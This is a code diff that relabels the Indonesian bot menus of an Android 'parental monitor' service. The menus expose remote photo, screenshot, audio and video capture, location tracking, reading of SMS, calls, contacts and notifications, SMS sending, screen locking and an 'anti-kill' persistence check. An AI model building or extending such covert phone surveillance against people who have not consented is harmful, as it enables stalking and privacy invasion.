@@ -1704,15 +1704,15 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.InlineButton(text, data)
         fun papan(vararg baris: List<com.redeye.parentalmonitor.network.InlineButton>) =
             com.redeye.parentalmonitor.network.InlineKeyboardMarkup(baris.toList())
-        val kembali = button("\u2B05\uFE0F Kembali", "m:main")
+        val menuUtama = button("\uD83C\uDFE0 Menu utama", "m:main")
         return when (id) {
             "media" -> MenuScreen(
-                "\uD83D\uDCF7 <b>Foto &amp; rekam</b>\nPilih tindakan di bawah.",
+                "\uD83D\uDCF7 <b>Foto &amp; rekam</b>\nTombol kamera memilih lensa untuk foto berikutnya.",
                 papan(
-                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5 Tangkap layar", "shot")),
-                    listOf(button("\uD83D\uDCF7 Kamera depan", "camfront"), button("\uD83D\uDCF7 Kamera belakang", "camback")),
+                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5\uFE0F Tangkap layar", "shot")),
+                    listOf(button("\uD83E\uDD33 Pakai kamera depan", "camfront"), button("\uD83D\uDCF7 Pakai kamera belakang", "camback")),
                     listOf(button("\uD83C\uDF99 Rekam audio", "num:media:record"), button("\uD83C\uDFAC Rekam video", "num:media:recordvideo")),
-                    listOf(kembali)
+                    listOf(menuUtama)
                 )
             )
             "lokasi" -> MenuScreen(
@@ -1721,40 +1721,41 @@ class MonitoringService : Service() {
                     listOf(button("\uD83D\uDCCD Lokasi", "location"), button("\uD83E\uDDB6 Jejak hari ini", "x:jejak")),
                     listOf(button("\uD83C\uDFE0 Jemput", "num:lokasi:jemput"), button("\uD83D\uDE97 Kendara", "x:kendara status")),
                     listOf(button("\uD83D\uDDFA\uFE0F Rumah", "i:lokasi:home"), button("\uD83C\uDFEB Sekolah", "i:lokasi:school")),
-                    listOf(kembali)
+                    listOf(menuUtama)
                 )
             )
             "komu" -> MenuScreen(
-                "\uD83D\uDCDE <b>Komunikasi</b>\nPanggilan, SMS, kontak, notifikasi.",
+                "\uD83D\uDCF1 <b>Komunikasi</b>\nPanggilan, SMS, kontak, notifikasi.",
                 papan(
                     listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS terakhir", "lastsms")),
                     listOf(button("\u2709\uFE0F Kirim SMS", "i:komu:sms"), button("\u2705 SMS tertunda", "x:smsconfirm")),
-                    listOf(button("\uD83D\uDD14 Notifikasi", "x:notif status"), button("\uD83D\uDCE8 Notif terakhir", "x:lastnotif")),
-                    listOf(button("\uD83D\uDC65 Cari kontak", "i:komu:contacts"), button("\uD83D\uDCE6 Aplikasi", "x:apps")),
-                    listOf(button("\uD83D\uDCDC Riwayat nomor", "i:komu:history")),
-                    listOf(kembali)
+                    listOf(button("\uD83D\uDD14 Notifikasi", "x:notif status"), button("\uD83D\uDCE8 Notifikasi terakhir", "x:lastnotif")),
+                    listOf(button("\uD83D\uDC65 Cari kontak", "i:komu:contacts"), button("\uD83D\uDCDC Riwayat nomor", "i:komu:history")),
+                    listOf(menuUtama)
                 )
             )
             "info" -> MenuScreen(
-                "\uD83D\uDCCA <b>Info &amp; data</b>\nStatus, izin, penyimpanan.",
+                "\u2139\uFE0F <b>Info &amp; data</b>\nStatus, izin, penyimpanan, aplikasi.",
                 papan(
                     listOf(button("\uD83D\uDCCA Status", "status"), button("\uD83D\uDCCB Ringkas", "x:ringkas")),
                     listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\u23F1\uFE0F Uptime", "x:uptime")),
-                    listOf(button("\u2139\uFE0F Versi", "x:version"), button("\uD83D\uDD10 Izin", "x:perms")),
-                    listOf(button("\uD83D\uDCBE Penyimpanan", "x:storage"), button("\uD83D\uDCC8 Pemakaian layar", "i:info:layar")),
-                    listOf(button("\uD83D\uDC93 Hidup", "alive"), button("\uD83E\uDDEA Uji anti-mati", "cekmati")),
-                    listOf(kembali)
+                    listOf(button("\uD83C\uDFF7\uFE0F Versi", "x:version"), button("\uD83D\uDD10 Izin", "x:perms")),
+                    listOf(button("\uD83D\uDCBE Penyimpanan", "x:storage"), button("\uD83D\uDCE6 Aplikasi", "x:apps")),
+                    listOf(button("\uD83D\uDCC8 Pemakaian layar", "i:info:layar"), button("\uD83D\uDC93 Sinyal hidup", "alive")),
+                    listOf(button("\uD83E\uDDEA Uji anti-mati", "cekmati")),
+                    listOf(menuUtama)
                 )
             )
             "pantau" -> MenuScreen(
                 "\uD83D\uDEE1\uFE0F <b>Pengawasan</b>\nTombol nyala/mati langsung jalan.",
                 papan(
-                    listOf(button("\uD83D\uDEB6 Patroli nyala", "x:patrol on"), button("\uD83D\uDEB6 Patroli mati", "x:patrol off")),
-                    listOf(button("\uD83C\uDF19 Malam nyala", "x:night on"), button("\uD83C\uDF19 Malam mati", "x:night off")),
-                    listOf(button("\uD83D\uDD24 Awasi kata", "i:pantau:watch"), button("\uD83D\uDCF5 Awasi nomor", "i:pantau:watchnomor")),
+                    listOf(button("\u25B6\uFE0F Patroli nyala", "x:patrol on"), button("\u23F9\uFE0F Patroli mati", "x:patrol off")),
+                    listOf(button("\uD83C\uDF19 Malam nyala", "x:night on"), button("\uD83C\uDF11 Malam mati", "x:night off")),
+                    listOf(button("\uD83D\uDD24 Awasi kata", "i:pantau:watch"), button("\uD83D\uDD22 Awasi nomor", "i:pantau:watchnomor")),
                     listOf(button("\uD83D\uDD58 Jam pulang", "i:pantau:jampulang"), button("\uD83D\uDCF6 Hemat data", "x:hematdata status")),
                     listOf(button("\uD83D\uDCCA Kewaspadaan", "x:waspada"), button("\uD83C\uDD98 HP hilang", "x:hilang")),
-                    listOf(button("\uD83D\uDC9A Pemulihan", "x:sembuh"), kembali)
+                    listOf(button("\uD83D\uDC9A Pemulihan", "x:sembuh")),
+                    listOf(menuUtama)
                 )
             )
             "alat" -> MenuScreen(
@@ -1762,9 +1763,10 @@ class MonitoringService : Service() {
                 papan(
                     listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
                     listOf(button("\uD83D\uDD12 Kunci layar", "x:lock"), button("\uD83D\uDD14 Bunyi HP", "num:alat:ring")),
-                    listOf(button("\uD83D\uDD04 Restart", "x:restart"), button("\uD83D\uDE80 Kirim antrean", "x:flush")),
-                    listOf(button("\uD83D\uDDD1\uFE0F Buang antrean", "x:clearqueue"), button("\u23F9\uFE0F Hentikan", "stop")),
-                    listOf(button("\uD83D\uDD22 Atur angka", "m:angka"), kembali)
+                    listOf(button("\uD83D\uDE80 Kirim antrean", "x:flush"), button("\uD83D\uDDD1\uFE0F Buang antrean", "x:clearqueue")),
+                    listOf(button("\uD83D\uDD04 Restart", "x:restart"), button("\u23F9\uFE0F Hentikan", "stop")),
+                    listOf(button("\uD83D\uDD22 Atur angka", "m:angka")),
+                    listOf(menuUtama)
                 )
             )
             "angka" -> MenuScreen(
@@ -1772,18 +1774,18 @@ class MonitoringService : Service() {
                 com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
                     numberInputs.chunked(2).map { baris ->
                         baris.map { button(it.button, "num:" + it.command.removePrefix("/")) }
-                    } + listOf(listOf(kembali))
+                    } + listOf(listOf(menuUtama))
                 )
             )
             else -> MenuScreen(
                 "\uD83E\uDD16 <b>Menu utama</b>\nPilih tombol cepat, atau buka kategori di bawah.",
                 papan(
-                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5 Tangkap layar", "shot")),
+                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5\uFE0F Tangkap layar", "shot")),
                     listOf(button("\uD83D\uDCCD Lokasi", "location"), button("\uD83D\uDCCA Status", "status")),
                     listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDEA8 Darurat", "x:darurat")),
-                    listOf(button("\uD83D\uDCF7 Foto & rekam", "m:media"), button("\uD83D\uDCDE Komunikasi", "m:komu")),
-                    listOf(button("\uD83D\uDDFA\uFE0F Lokasi & jejak", "m:lokasi"), button("\uD83D\uDCCA Info & data", "m:info")),
-                    listOf(button("\uD83D\uDEE1\uFE0F Pengawasan", "m:pantau"), button("⚙️ Alat & kontrol", "m:alat")),
+                    listOf(button("\uD83D\uDCF7 Media", "m:media"), button("\uD83D\uDCF1 Komunikasi", "m:komu")),
+                    listOf(button("\uD83D\uDDFA\uFE0F Lokasi & jejak", "m:lokasi"), button("\uD83D\uDEE1\uFE0F Pengawasan", "m:pantau")),
+                    listOf(button("\u2139\uFE0F Info & data", "m:info"), button("⚙️ Alat & kontrol", "m:alat")),
                     listOf(button("\uD83D\uDD22 Atur angka", "m:angka"))
                 )
             )
